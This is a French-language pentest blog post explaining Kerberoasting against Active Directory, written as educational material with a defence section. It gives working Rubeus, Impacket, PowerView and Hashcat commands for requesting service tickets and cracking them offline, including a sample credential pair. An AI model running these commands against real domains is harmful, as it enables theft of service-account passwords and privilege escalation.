---
title: "Kerberoasting : Attaque d'Active Directory via Kerberos"
date: 2025-05-05T19:00:00+02:00
draft: false
tags: ["Active Directory", "blog", "Kerberos", "attaques", "pentest"]
categories: ["Active Directory"]
summary: "Une attaque redoutable post-exploitation qui cible les services Kerberos dans les environnements Active Directory. Décryptons ensemble la méthode, les outils et les moyens de défense."
showToc: true
tocOpen: true
---

## Introduction

**Kerberoasting** est une technique d’attaque post-exploitation qui cible les environnements **Active Directory**, plus précisément les **comptes de service** protégés par le protocole d’authentification **Kerberos**.

L’objectif de l’attaquant est de récupérer des **tickets de service (TGS)** chiffrés, puis de **craquer hors ligne** les **hashs** de mots de passe des comptes de service associés à des **Service Principal Names (SPN)**. Une fois le mot de passe récupéré, cela peut mener à une **élévation de privilèges** ou à une **lateralisation dans le réseau**.

---

## ⚙️ Fonctionnement du protocole Kerberos (rappel rapide)

Lorsqu’un utilisateur demande l’accès à un service, il envoie un **TGT (Ticket Granting Ticket)** valide et le nom du service (via le `sname`) au **KDC (Key Distribution Center)**. Si le ticket est valide, le KDC renvoie un **TGS**, chiffré avec le hash du mot de passe du compte de service ciblé.

C’est cette étape que l’attaquant va détourner pour capturer ce TGS et tenter de retrouver le mot de passe par **brute force ou dictionnaire**.

---

## 🧠 Étapes de l’attaque Kerberoasting

Voici le **workflow typique** d’une attaque Kerberoasting :

### 1. Accès initial
L’attaquant compromet un **compte d’utilisateur standard** dans le domaine Active Directory.

### 2. Reconnaissance
Il utilise des outils pour **énumérer les SPN** présents dans le domaine (comptes de service).

### 3. Requête TGS
Il envoie des requêtes au **contrôleur de domaine** pour obtenir les tickets TGS associés à ces SPN.

### 4. Extraction de tickets
Il extrait les TGS **localement** (le système les stocke en mémoire), à l’aide d’outils comme **Rubeus** ou **Mimikatz**.

### 5. Crackage hors ligne
Le ticket est cracké hors ligne avec **Hashcat** ou **John the Ripper** afin de révéler le **mot de passe du compte de service**.

---

## 🔧 Outils utiles

Voici une liste d’outils populaires pour mener une attaque Kerberoasting :

- **[Rubeus](https://github.com/GhostPack/Rubeus)** (C#)
- **Mimikatz**
- **Impacket - GetUserSPNs.py**
- **PowerView (PowerShell)**
- **Empire / Invoke-Kerberoast.ps1**
- **Hashcat** ou **John** pour le crackage hors ligne

---

## 💥 Exécution de l’attaque - Cas pratiques

### 🎯 Kerberoasting avec Rubeus

```bash
Rubeus.exe kerberoast
```

### 💣 Cracker le hash avec Hashcat

```bash
hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

---

### 🐍 Kerberoasting avec Impacket (GetUserSPNs.py)

Lister les comptes SPN :

```bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

Extraire le TGS chiffré :

```bash
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.3.141 -request
```

---

### ⚡ Kerberoasting avec PowerView

Importer PowerView :

```powershell
Import-Module .\PowerView.ps1
```

Lister les utilisateurs avec SPN :

```powershell
Get-DomainUser * -SPN | select samaccountname
```

Extraire un TGS au format Hashcat :

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

Exporter tous les tickets  vers un fichier CSV:

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tickets.csv -NoTypeInformation
```

---

## 🧭 Contextes d’exécution possibles

Une attaque Kerberoasting peut être lancée à partir de différents environnements :

- 💻 **Windows joint au domaine**, avec un shell utilisateur ou SYSTEM
- 🐧 **Linux joint ou non au domaine**, avec keytab ou identifiants
- 🔐 **Shell distant avec `runas /netonly`** sur Windows
- 🧪 **Via un accès VPN ou une session RDP**, avec des outils de pentest

---

## 🛡️ Détection & défense

Pour **se défendre contre Kerberoasting**, voici quelques bonnes pratiques :

- Utiliser des **mots de passe robustes** et complexes pour les comptes de service
- Éviter les comptes de service à privilèges élevés (comme `Domain Admin`)
- Implémenter **Managed Service Accounts (MSA/gMSA)**
- Surveiller les **requêtes TGS en masse**
- Déployer des solutions de **détection comportementale (EDR, SIEM, etc.)**
- Restreindre les permissions des utilisateurs standards

---

## 📚 Références utiles

- [Rubeus GitHub](https://github.com/GhostPack/Rubeus)
- [Impacket Tools](https://github.com/SecureAuthCorp/impacket)
- [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [Kerberoasting Technique (MITRE ATT&CK)](https://attack.mitre.org/techniques/T1558/003/)


